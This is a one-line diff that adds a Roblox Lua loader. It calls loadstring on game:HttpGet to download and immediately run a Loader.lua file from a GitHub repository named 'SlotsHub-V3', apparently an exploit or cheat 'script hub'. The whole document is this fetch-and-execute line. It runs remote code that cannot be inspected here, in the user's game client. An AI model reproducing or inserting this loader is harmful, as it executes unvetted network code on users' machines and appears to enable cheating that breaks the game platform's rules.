@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Brembo19/SlotsHub-V3/refs/heads/main/Loader.lua')))()
